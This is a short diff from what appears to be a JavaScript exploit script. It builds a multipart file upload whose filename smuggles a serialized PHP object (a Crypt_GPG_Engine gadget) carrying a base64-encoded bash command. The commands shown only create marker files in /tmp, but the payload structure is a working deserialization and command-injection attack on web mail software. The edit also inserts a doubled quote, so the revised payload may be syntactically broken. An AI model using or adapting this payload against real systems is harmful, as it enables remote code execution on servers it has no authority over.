@@ -53,9 +53,9 @@
   const boundary = '----WebKitFormBoundary' + Math.random().toString(36).slice(2);
 
   const malFilename =
-    'payload.php;|O:16:\\"Crypt_GPG_Engine\\":1:{s:8:\\"_gpgconf\\";s:52:\\"bash -c \' $(base64 -d <<< \\"dG91Y2ggL3RtcC9hYjE=\\")\';#\\";};';
+    'payload.php;|O:16:\\"Crypt_GPG_Engine\\":1:{s:8:\\"_gpgconf\\";s:52:\\"bash -c \' $(base64 -d <<< \\""dG91Y2ggL3RtcC8xMjM=\\")\';#\\";};';
 
-  const rawFilename = 'payload.php;|O:16:"Crypt_GPG_Engine":1:{s:8:"_gpgconf";s:52:"bash -c \' $(base64 -d <<< "dG91Y2ggL3RtcC9hYjE=")\';#";};';
+  const rawFilename = 'payload.php;|O:16:"Crypt_GPG_Engine":1:{s:8:"_gpgconf";s:52:"bash -c \' $(base64 -d <<< ""dG91Y2ggL3RtcC8xMjM=")\';#";};';
   const safeFilename = rawFilename.replace(/"/g, '\\"');  // Escape tất cả dấu "
 
   const preamble =
